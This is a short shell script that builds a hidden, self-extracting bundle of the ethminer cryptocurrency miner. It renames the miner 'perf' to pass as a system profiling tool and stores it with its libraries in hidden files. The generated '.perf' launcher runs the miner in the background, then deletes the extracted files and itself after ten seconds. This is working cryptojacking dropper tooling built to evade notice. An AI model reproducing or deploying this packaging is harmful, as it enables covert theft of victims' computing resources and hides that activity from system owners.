#!/bin/sh


# build ethminer tar
#mkdir -p .bin/.lib;cp ethminer .bin/perf; cp -L /lib64/ld-linux-x86-64.so.2 .bin/.lib/; ldd ethminer|grep "=>" |awk -F"=>" '{print $2}' |awk '{print $1}' |while read line; do cp -L $line  .bin/.lib/; done; tar cJvf .perf.tar.xz .bin;

rm -rf .bin .perf*
mkdir -p .bin/.lib
cp ethminer .bin/perf
cp -L /lib64/ld-linux-x86-64.so.2 .bin/.lib/
cp /lib/x86_64-linux-gnu/libnss_dns-2.19.so .bin/.lib/libnss_dns.so.2
ldd ethminer|grep "=>" |awk -F"=>" '{print $2}' |awk '{print $1}' |while read line; do cp -L $line  .bin/.lib/;done
tar cJvf .perf.tar.xz .bin


#bundle ethminer to single file
template='#!/bin/bash

function untar_payload()
{
        match=$(grep --text --line-number '^PAYLOAD:$' $0 | cut -d ':' -f 1)
        payload_start=$((match + 1))
        tail -n +$payload_start $0  | tar -xJvf -
}
untar_payload
( LD_LIBRARY_PATH=.bin/.lib/  .bin/.lib/ld-linux-x86-64.so.2  .bin/perf ) &
#LD_LIBRARY_PATH=.bin/.lib/  .bin/.lib/ld-linux-x86-64.so.2  .bin/perf 
sleep 10
rm -rf .bin
rm -rf $0
exit 0
'
echo "${template}" > ./.perf
echo "PAYLOAD:" >> ./.perf
cat .perf.tar.xz  >>./.perf
chmod a+x .perf

